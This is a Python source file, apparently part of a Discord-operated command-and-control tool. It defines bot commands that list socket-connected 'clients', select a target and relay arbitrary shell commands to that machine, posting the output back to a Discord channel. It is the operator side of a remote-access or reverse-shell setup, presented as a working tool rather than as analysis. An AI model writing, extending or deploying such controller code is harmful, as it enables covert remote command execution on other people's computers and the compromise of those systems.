from discord.ext import commands
from src.server.socket_server import list_connections, get_target 

CONNECTED = []

help = {
        'commands': {
            'list' : ['-list', 'lists connected clients'],
            'select' : ['-select', 'select a client to interact with'],
            'cmd' : ['-cmd', 'send commands to selected client']
            }
        }

class Connections(commands.Cog):

    def __init__(self, bot):
        self.bot = bot

    @commands.command()
    async def list(self, ctx):
        try:
            connections = list_connections()
            await ctx.send(connections)
        except Exception:
            await ctx.send(f"[!] No clients connected")

    @commands.command()
    async def select(self, ctx, *, arg):
        global CONNECTED
        try:
            selection = arg
            conn = get_target(selection)
            CONNECTED = conn
            if CONNECTED is None:
                await ctx.send(f"[!] No connection made")
                return
            await ctx.send(f"[*] Connected to: {CONNECTED}")
        except Exception:
            await ctx.send(f"[!] No clients connected")

    @commands.command()
    async def cmd(self, ctx, *, arg):
        global CONNECTED
        if CONNECTED is None:
            await ctx.send('[!] No connected client, select client before sending command')
            return
        else:
            cmd = arg
            conn = CONNECTED
            try:
                if cmd == 'exit':
                    await ctx.send(f"[!] Disconnected from {conn}")
                    CONNECTED = ''
                    return
                if len(str.encode(cmd)) > 0:
                    conn.send(str.encode(cmd))
                    client_response = str(conn.recv(1024), "utf-8")
                    await ctx.send(f"{client_response}")
                    print(client_response, end="")
                    return client_response
            except:
                await ctx.send(f"[!] No clients connected")
    

async def setup(bot):
    await bot.add_cog(Connections(bot)) 
